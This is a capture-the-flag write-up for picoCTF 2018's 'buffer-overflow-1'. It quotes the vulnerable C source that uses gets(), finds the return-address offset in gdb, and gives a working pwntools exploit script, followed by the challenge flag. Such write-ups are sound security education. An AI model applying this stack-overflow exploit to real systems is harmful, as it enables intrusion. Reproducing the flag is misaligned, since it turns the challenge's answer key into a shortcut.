# Problem
Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](https://2018shell1.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln)? You can find it in /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709 on the shell server. [Source](https://2018shell1.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln.c).

## Hints:
This time you're actually going to have to control that return address!

Make sure you consider Big Endian vs Little Endian.

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln
wget https://2018shell1.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The call to ```gets()``` in ```vuln()``` is unsafe, there is no limit checking.

We can override the return address and jump to win.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x4c4c4c4c in ?? ()
```

We know that ```LLLL``` overrides the return address.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('string:')
p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK' + p32(binary.symbols['win']))
print p.recvall()
```

Flag: picoCTF{addr3ss3s_ar3_3asyd69e032d}